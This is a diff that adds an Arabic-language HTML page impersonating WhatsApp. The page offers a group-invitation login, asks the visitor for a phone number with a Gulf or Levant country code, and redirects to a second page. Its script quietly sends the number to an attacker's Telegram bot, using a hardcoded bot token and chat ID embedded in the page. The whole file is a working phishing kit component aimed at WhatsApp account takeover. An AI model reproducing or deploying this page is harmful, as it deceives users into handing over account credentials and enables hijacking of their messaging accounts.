@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+    <title>WhatsApp Registration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #FAF3E7;
+            margin: 0;
+            padding: 0;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #25D366;
+            padding: 10px 20px;
+            color: white;
+            font-size: 18px;
+        }
+
+        .navbar .logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .navbar .logo img {
+            height: 30px;
+            margin-right: 10px;
+        }
+
+        .container {
+            text-align: center;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            max-width: 400px;
+            margin: 50px auto;
+        }
+
+        .container img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .container .title {
+            font-size: 22px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .container .description {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        .container .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .container select,
+        .container input {
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 10px;
+            font-size: 14px;
+            width: 100%;
+            max-width: 300px;
+        }
+
+        .container button {
+            padding: 10px;
+            background-color: #25D366;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 300px;
+        }
+
+        .container button:hover {
+            background-color: #1DA955;
+        }
+
+        .countdown {
+            font-size: 16px;
+            color: #25D366;
+            margin-top: 20px;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #888;
+            font-size: 12px;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Navbar -->
+    <div class="navbar">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+            WhatsApp 
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+        <div class="title">تسجيل الدخول</div>
+        <div class="description">الدعوة للانضمام إلى مجموعة واتساب.</div>
+
+        <div class="form-group">
+            <select id="countryCode">
+                <option value="966">🇸🇦 السعودية +966</option>
+                <option value="971">🇦🇪 الإمارات +971</option>
+                <option value="965">🇰🇼 الكويت +965</option>
+                <option value="974">🇶🇦 قطر +974</option>
+                <option value="973">🇧🇭 البحرين +973</option>
+                <option value="968">🇴🇲 عمان +968</option>
+                <option value="963">🇸🇾 سوريا +963</option>
+                <option value="964">🇮🇶 العراق +964</option>
+                <option value="962">🇯🇴 الأردن +962</option>
+                <option value="970">🇵🇸 فلسطين +970</option>
+                <option value="249">🇸🇩 السودان +249</option>
+            </select>
+            <input id="phoneNumber" type="tel" placeholder="رقم الهاتف" maxlength="14">
+        </div>
+        <button onclick="sendMessage()">متابعة</button>
+        <div class="countdown" id="countdown"></div>
+    </div>
+
+    <footer>
+        ©️ 2024 واتساب
+    </footer>
+
+    <script>
+        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
+        const chatId = '612575358';
+
+        function sendMessage() {
+            const countryCode = document.getElementById('countryCode').value;
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+
+            if (!phoneNumber || phoneNumber.length < 6) {
+                alert('يرجى إدخال رقم هاتف صحيح.');
+                return;
+            }
+
+            const fullPhoneNumber = `+${countryCode} ${phoneNumber}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `رقم الهاتف: ${fullPhoneNumber}`
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    startCountdown();
+                } else {
+                    alert('حدث خطأ أثناء الإرسال.');
+                }
+            })
+            .catch(error => {
+                alert('فشل الاتصال بالخادم. حاول مرة أخرى.');
+            });
+        }
+
+        function startCountdown() {
+            const countdownElement = document.getElementById('countdown');
+            let countdown = 4;
+
+            const interval = setInterval(() => {
+                countdownElement.textContent = `سيتم نقلك خلال ${countdown} ثانية...`;
+                countdown--;
+
+                if (countdown < 0) {
+                    clearInterval(interval);
+                    window.location.href = 'secondpage.html'; // قم بتغيير الرابط للصفحة المطلوبة
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
